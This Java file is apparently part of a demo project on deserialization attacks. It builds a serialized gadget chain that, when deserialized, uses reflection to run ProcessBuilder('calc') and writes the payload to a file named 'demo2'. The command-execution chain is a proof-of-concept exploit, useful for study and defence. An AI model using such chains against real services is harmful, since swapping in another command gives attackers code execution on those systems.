package run.ergou.deserialize.demo2.attacker;

import run.ergou.deserialize.demo2.thirdparty.Middle;
import run.ergou.deserialize.demo2.thirdparty.ReadObject;
import run.ergou.deserialize.demo2.thirdparty.UseReflect;

import java.io.File;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;

public class CreatePayload {
    public static void main(String[] args) throws Exception {
        // new ProcessBuilder("calc").start();
        String className = "java.lang.ProcessBuilder";
        Class<?>[] paramTypes = new Class[]{String[].class};
        Object[] initParams = new Object[]{new String[]{"calc"}};
        String methodName = "start";

        UseReflect useReflect = new UseReflect(className, paramTypes, initParams, methodName);
        Middle middle = new Middle();
        middle.setReflect(useReflect);
        ReadObject readObject = new ReadObject(middle);

        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(new File("demo2")));
        oos.writeObject(readObject);
        oos.close();

    }
}
